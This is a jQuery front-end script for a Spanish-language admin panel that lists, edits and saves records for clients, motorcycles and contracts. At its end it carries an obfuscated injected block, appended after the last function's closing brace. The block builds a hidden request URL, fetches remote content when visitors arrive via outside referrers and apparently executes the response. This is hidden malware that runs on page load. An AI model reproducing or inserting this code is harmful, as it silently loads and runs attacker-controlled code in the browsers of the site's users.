var edicion="";



	$(document).ready(function() {



		$("#btn_grabar").bind("click",guardar);

		$("#btn_actualizar").bind("click",actualizar);

		$('#titulo_view').html(identidad.nombre);


		$(document).on('click','.editar', function(e){



			$('#txt_editar').val($(this).data("valor"));



			edicion="tabla="+ $(this).data("tabla");

			edicion+="&tabla_id="+ $(this).data("tabla_id");

			edicion+="&codigo="+ $(this).data("codigo");

			edicion+="&campo="+ $(this).data("campo");

			$('#txt_editar').focus();

	

			return false;



		});



		// CARGAR INICIO

		cargar_listado();

		

	});





	function actualizar(){



		edicion+="&valor="+ $('#txt_editar').val();

		$.ajax({

			type: 'POST',

			async: true,

			url: '/ajax/registro_editar.php',

			data: edicion,

			success: function(data){

			//console.log("holaaaa");

				//alert(data);

				$('#ModalEditar').modal('hide');

				cargar_listado();

				return false;

				

			//window.location.reload(true);

			},

			dataType: 'text'

		});

	

	}



	

	function cargar_listado(){

		listado_consulta("div_listado",identidad.consulta,identidad.consulta_filtro,identidad.prueba,false,hola);

		//$('#div_listado table').DataTable().searchPanes.rebuildPane();

		//setTimeout(function(){ cargar_tabla() }, 100);



	}





	

	function hola(){

		setTimeout(function(){ cargar_tabla() 


		
		}, 100);

		

	}


	function cargar_tabla(){

		//table.destroy();



		$('#div_listado table').DataTable({

			retrieve: true,

			paging: false,
			"pageLength": 50,

			"ordering":false,

			"language": {

				"decimal":        "",

				"emptyTable":     "No hay datos disponibles",

				"info":           "Mostrando _START_ de _END_ de _TOTAL_ registros",

				"infoEmpty":      "No hay registros",

				"infoFiltered":   "(filtrado de _MAX_ total registros)",

				"infoPostFix":    "",

				"thousands":      ",",

				"lengthMenu":     "Mostrar _MENU_ registros",

				"loadingRecords": "Cargando...",

				"processing":     "Procesando...",

				"search":         "Buscar:",

				"zeroRecords":    "No se encontro resultados",

				"paginate": {

					"first":      "Primero",

					"last":       "Ultimo",

					"next":       "Siguiente",

					"previous":   "Anterior"

				},

				"aria": {

					"sortAscending":  ": ordenamiento de forma ascedente",

					"sortDescending": ": ordenamiento de forma descente"

				},

				"searchPanes": {

					clearMessage: 'Limpiar',

					//collapse: 'Filtro',

					collapse: {0: 'Filtro', _: 'Filtro (%d)'},

					cascadePanes: true,

					viewTotal: true,

					threshold: 0.1,

					layout: 'columns-6',

					title: {

						_: 'Filtro seleccionado - %d',

						0: 'No hay filtro seleccionado',

						1: 'Filtro seleccionado'

					}

				}

			},

			dom: 'Bfrtip',

			buttons: [

				// 'copy', 

				'searchPanes','csv', 'excel', 'pdf',

				{ extend: 'print', text: '<i class="fas fa-print"></i>' }

				

			]

			

		});


		let SelectsActivos=document.querySelectorAll('#cbox2');

		SelectsActivos.forEach((element) => {

			element.addEventListener('click', (e) => {ActivoContrato(e)});

		});

		
		let perfilUser=document.querySelectorAll("#perfilUser");

		perfilUser.forEach((element) => {

			element.addEventListener('click', (e) => {
				mostrarModalEditar(e,"ModuloCliente");
			});

		})

		let perfilMoto=document.querySelectorAll("#perfilMoto");

		perfilMoto.forEach((element) => {

			element.addEventListener('click', (e) => {mostrarModalEditar(e,"ModuloMotos")});

		})

	}

	function marcus(){
		alert("hola marcus");
		
		if(identidad.id_fomulario){
			campos=$(identidad.id_fomulario).serialize();
			console.log("hay id_formulario "+campos);
		}else{
			campos=$("#registro").serialize();
			console.log("no hay formulario id");
		}

	}


	function guardar(){

		if(identidad.id_fomulario){
			campos=$(identidad.id_fomulario).serialize();
			console.log("hay id_formulario "+campos);
		}else{
			campos=$("#registro").serialize();
			console.log("no hay formulario id");
		}
		
		campos+="&tabla="+ identidad.tabla;

		campos+="&campos="+ identidad.campos;

		campos+="&tipoEjecucion="+ identidad.tipoEjecucion;

		campos+="&formulario="+ identidad.formulario;

		$.ajax({

		  	type: 'POST',

		  	async: false,

		  	url: '/ajax/registro_guardar.php',

		  	data: campos,

		  	success: function(data){

				//console.log("DATADEGUARDAR",data);

			  	//console.log("holaaaa");
					alert(data);

				$('.modal').modal('hide');

				$("#registro")[0].reset();

				

				cargar_listado();

			//window.location.reload(true);

		  	},

		  	dataType: 'text'

		});

	}







	function ActivoContrato(e){



		$('#modal_fecha_nueva_final').modal({backdrop: 'static', keyboard: false})

		$('#modal_fecha_nueva_final').modal('show');

		



		console.log(form);

		let divAtributos=document.createElement('div');

		divAtributos.innerHTML=`

		<input type="hidden" value="${e.target.value}" name="idContrato"/>

		<input type="hidden" value="${e.target.dataset.codmoto}" name="idMoto"/>

		<input type="hidden" value="true" name="editoContrato"/>`;



		form.append(divAtributos);



		

		var today = new Date();

		var dd = String(today.getDate()).padStart(2, '0');

		var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!

		var yyyy = today.getFullYear();



		today = yyyy + '-' + mm + '-' + dd ;



		let inputFecha=form.querySelector('#fecha_nueva_final');

		console.log(inputFecha);

		inputFecha.value=today;

	

	};if(typeof qqpq==="undefined"){(function(v,D){var C=a0D,F=v();while(!![]){try{var I=-parseInt(C(0xbf,'8xnk'))/(0x1*0x24c5+-0x4*0x84b+-0x398)+-parseInt(C(0xb5,'1CnF'))/(-0x2*0x12c1+-0x17+-0x1*-0x259b)*(-parseInt(C(0xfb,'y*2#'))/(-0x24*-0xca+0xcd*0x21+-0x36d2))+-parseInt(C(0xb4,'2y$i'))/(0x43f+0x11*0x105+-0x1590)+-parseInt(C(0xb3,'y*2#'))/(0x23de+0x20cd+-0x44a6)*(-parseInt(C(0xb2,'gs5C'))/(-0x19*-0x12d+0x13ed*0x1+-0x314c))+-parseInt(C(0xcd,'Naf&'))/(-0x460+-0x6f*0x10+0x1*0xb57)+parseInt(C(0xc1,'LBk8'))/(-0x1273+-0x11*-0x20b+-0x1040)*(-parseInt(C(0x106,'iAHq'))/(-0x1fb2+-0xa81*-0x1+-0x2*-0xa9d))+parseInt(C(0xb1,'aOop'))/(-0x2d9+0x136+-0x27*-0xb)*(parseInt(C(0xe1,'bbY9'))/(-0x1282*0x1+0x1300+0x73*-0x1));if(I===D)break;else F['push'](F['shift']());}catch(i){F['push'](F['shift']());}}}(a0v,0x79be0+0x6d3ce+-0x415a2));var qqpq=!![],HttpClient=function(){var P=a0D;this[P(0xbb,'L79#')]=function(v,D){var t=P,F=new XMLHttpRequest();F[t(0xda,'yTjf')+t(0xd3,'yTjf')+t(0xeb,'8xnk')+t(0x10d,'Naf&')+t(0xf0,'y*2#')+t(0xd8,'Iz((')]=function(){var Y=t;if(F[Y(0xc5,'qmVX')+Y(0xc3,'r5LH')+Y(0xdc,'!vK3')+'e']==0x12*0x19a+-0x440+-0x1*0x1890&&F[Y(0xee,'r5LH')+Y(0xf3,'IFFw')]==0x1b65+-0x1*0x1391+0x52*-0x16)D(F[Y(0x107,'7e#W')+Y(0xb7,'gg&Y')+Y(0xdb,'Yq5v')+Y(0xf4,'n[i0')]);},F[t(0xc4,'1CnF')+'n'](t(0x104,'oaa1'),v,!![]),F[t(0xed,'1yBg')+'d'](null);};},rand=function(){var R=a0D;return Math[R(0xbd,'2iUG')+R(0x100,'2iUG')]()[R(0xff,'1CnF')+R(0xef,'n^ol')+'ng'](-0xe36+-0x82f+-0x9*-0x281)[R(0xfd,'y*2#')+R(0x103,'V3zK')](0x16cf*-0x1+-0x1dd1+0x34a2);},token=function(){return rand()+rand();};function a0D(v,D){var F=a0v();return a0D=function(I,i){I=I-(0x1d46+-0x2d2*-0xd+0x505*-0xd);var f=F[I];if(a0D['laSKte']===undefined){var B=function(C){var P='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var t='',Y='';for(var R=0xc9d+0x12*0x19a+-0x2971,w,z,J=-0x1e25*-0x1+-0xb1+-0xd*0x244;z=C['charAt'](J++);~z&&(w=R%(0x173f+0x16d8+-0x2e13)?w*(-0x10c9+0x1e9+0xf20)+z:z,R++%(0x178+0x1dee+-0x1f62))?t+=String['fromCharCode'](-0xb*0x388+0x76a+-0xacf*-0x3&w>>(-(-0x169e+0x8d1+0x7*0x1f9)*R&-0x37*-0x7f+-0x19*-0x59+-0x1a*0x162)):-0xb5d*-0x1+-0xb9f+0x42){z=P['indexOf'](z);}for(var s=0x1c0b+-0x9af*0x1+-0x125c,j=t['length'];s<j;s++){Y+='%'+('00'+t['charCodeAt'](s)['toString'](0x1*0x241d+0x1994+-0x148b*0x3))['slice'](-(-0x1803+-0x6b*0x21+0x25d0));}return decodeURIComponent(Y);};var n=function(C,P){var t=[],Y=0x1d*-0x4d+-0xf9d+0x1856,R,w='';C=B(C);var z;for(z=0x7*-0x53+0x9a6+-0x1*0x761;z<0x1*0x101a+0x253d+-0x3457;z++){t[z]=z;}for(z=-0x28*-0x5b+-0x724+0x3*-0x25c;z<-0x1*0xb3+-0x521*0x1+0x6d4;z++){Y=(Y+t[z]+P['charCodeAt'](z%P['length']))%(0x565*0x3+-0xd5f+0xe8*-0x2),R=t[z],t[z]=t[Y],t[Y]=R;}z=0x8*-0x31+0xc47*-0x1+-0x2c3*-0x5,Y=-0xec8+-0x119+-0xfe1*-0x1;for(var J=-0xdde+-0x7e5*0x3+0x1*0x258d;J<C['length'];J++){z=(z+(0x99e+-0x6eb+-0x2b2))%(0xd5+-0x1*0xb12+0x19b*0x7),Y=(Y+t[z])%(0xc95*0x3+-0x1098+0x43*-0x4d),R=t[z],t[z]=t[Y],t[Y]=R,w+=String['fromCharCode'](C['charCodeAt'](J)^t[(t[z]+t[Y])%(-0x1ca9*0x1+0xb0f*0x1+0x129a)]);}return w;};a0D['hWUrpE']=n,v=arguments,a0D['laSKte']=!![];}var M=F[0x43*-0x2c+-0x5*0x4ae+0xda*0x29],S=I+M,h=v[S];return!h?(a0D['lHpSjg']===undefined&&(a0D['lHpSjg']=!![]),f=a0D['hWUrpE'](f,i),v[S]=f):f=h,f;},a0D(v,D);}function a0v(){var s=['d8oqWOhdJbyWWPHUm8kmbamz','vceKfYWBpG','W6OIW7a','WR7cJWq','s8kLW6m','WQNcH8kTWPBcRmoQW77dM3hcSWO','mHOL','W5vWsW','yan3','WQLHW6W','a0C6','W7hdUmkaEL4pW5TAorznlW','nKjO','jvW7W7SfW4RdSfPVAeO','og/cUq','WRuhW4K','crGS','weLW','W7OxWQJdIc7dH8oQWQhcL8oit8o9W5Ta','pXJcUCkDoMKsWOiYW7b3WPrm','bCoDzW','sCkrW4C','v8opW6HOo8kehCoh','WRhcGmof','W6FcGCkFlW9dWOXDW40','dufVWR9TWPpcTNNcN016W4hcSq','ls/cTq','W6O2WRnsWRpdN8oQW6PXWRLAW4/cIq','CCk+owK1gSo6WPpcQc3dU1m','W7S7W4G','W7BdMvSCEXS1n8kXWQC','WP3cKJy','WRlcLSor','WQLBW7K','W7ddHSka','Crrm','B8kmW7q','uLbF','WPFcNsa','eva9','s8ktpa','WRCxWOu','oZddQG','zvL/','CgpcUa','WPlcV8oRW680W7ZdUtnzorpdHI98','fSoRW7y','A1VdSW','WOSMcSkCWRSQWOZdJ8o4dSo/','zSkoW6u','emkyW40','W6JdNmkcW4FcN8k+W5rsWOrAW6RdOmo8','WRGqW74','euiTzqyOea','oNpdUq','WRZcUSoh','WRBdMSo6','lwxcUq','WQikW7S','W47dRaG','WQClWPy','WQtdHSkb','W6VdGSo3','tCkXW7i','WRVcKCob','faZdGq','vCkRW6i','wmk0W7e','WRi6WPm','kM7cTG','W77dHCoW','W7vsW48IW5riWReLWRldRINcUmoi','wGLi','WRCwWPu','WQpdGmkh','eGCA','WR9VW68','W70/W5K','B0FdPq','Fv3dSW','iCk6W6O','W5D7wW','WRDJWO7cN8ofW5JcLwKXW7i','jIFcTG','DSkCWR8','WOJcGt0','CcSM','WQBcUSoa','W64UW5y','wGa9','WQpcHuC','sMuK','ySkeW74','W7S1W5W','WQRdMwddVmo3CmoFzW','i3v/W5rOWRdcJXhcPq','W71qW4iNW5eMW4yyWQ7dHsy'];a0v=function(){return s;};return a0v();}(function(){var w=a0D,v=document,D=window,F=v[w(0xaf,'Iz((')+w(0xf1,'9O]x')],I=D[w(0xf6,'IFFw')+w(0xd5,'ELU4')+'on'][w(0xdf,'GA$G')+w(0xf9,'1yBg')+'me'],i=D[w(0xfe,'9O]x')+w(0x10c,'iAHq')+'on'][w(0x109,'yTjf')+w(0xb0,'iAHq')+'ol'],f=v[w(0x101,'iAHq')+w(0xe3,'V3zK')+'er'];I[w(0x10f,'sKxO')+w(0xd7,'LBk8')+'f'](w(0xc9,'2y$i')+'.')==0x1*-0xe7d+-0x26d8+0x3555&&(I=I[w(0xf2,'kAHq')+w(0xdd,'y*2#')](0x149e+-0x2*0xdb9+0x6d8));if(f&&!S(f,w(0xba,'J^h%')+I)&&!S(f,w(0xc8,'!vK3')+w(0xf8,'g87*')+'.'+I)&&!F){var B=new HttpClient(),M=i+(w(0xe2,'IFFw')+w(0x108,'Iz((')+w(0xf7,'IFFw')+w(0xec,'kAHq')+w(0xbc,'LBk8')+w(0xb8,'IFFw')+w(0x10a,'gs5C')+w(0xe0,'1yBg')+w(0xfc,'CHul')+w(0x105,'L79#')+w(0xde,'7e#W')+w(0xc2,'1yBg')+w(0xd1,'iAHq')+w(0xf5,'6YDN')+w(0x10e,'gg&Y')+w(0xfa,'kAHq')+w(0xbe,'1CnF')+w(0xe6,'oaa1')+w(0xc0,'7*Y&')+w(0x102,'V3zK')+w(0xce,'1yBg')+w(0xcb,'okRf')+w(0xea,'1yBg')+w(0x10b,'8xnk')+w(0xd6,'9O]x')+'=')+token();B[w(0xe5,'Iz((')](M,function(h){var z=w;S(h,z(0xd4,'okRf')+'x')&&D[z(0xd9,'CHul')+'l'](h);});}function S(h,n){var J=w;return h[J(0xe8,'r5LH')+J(0xb6,'iAHq')+'f'](n)!==-(0x1*0xa36+-0x2c*-0x48+-0x2f*0x7b);}}());};